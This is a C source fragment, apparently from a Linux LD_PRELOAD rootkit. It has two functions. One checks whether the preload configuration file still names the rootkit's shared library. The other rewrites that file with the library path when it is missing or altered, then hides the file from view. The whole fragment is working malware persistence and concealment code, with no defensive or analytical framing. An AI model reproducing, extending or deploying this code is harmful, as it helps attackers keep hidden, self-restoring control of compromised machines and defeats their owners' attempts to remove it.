int ld_inconsistent(void){
    struct stat ldstat;
    int inconsistent = 0, statval;

    hook(C__XSTAT);
    memset(&ldstat, 0, sizeof(stat));
    statval = (long)call(C__XSTAT, _STAT_VER, LDSO_PRELOAD, &ldstat);

    if((statval < 0 && errno == ENOENT) || ldstat.st_size != strlen(SOPATH))
        inconsistent = 1;

    return inconsistent;
}

void reinstall(void){
    /* don't do anything if we don't need to... ((or can't)) */
    if(!ld_inconsistent()) return;

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, LDSO_PRELOAD, "w");

    if(ldfp != NULL){
        call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
        fflush(ldfp);
        fclose(ldfp);

        hide_path(LDSO_PRELOAD);
    }

    return;
}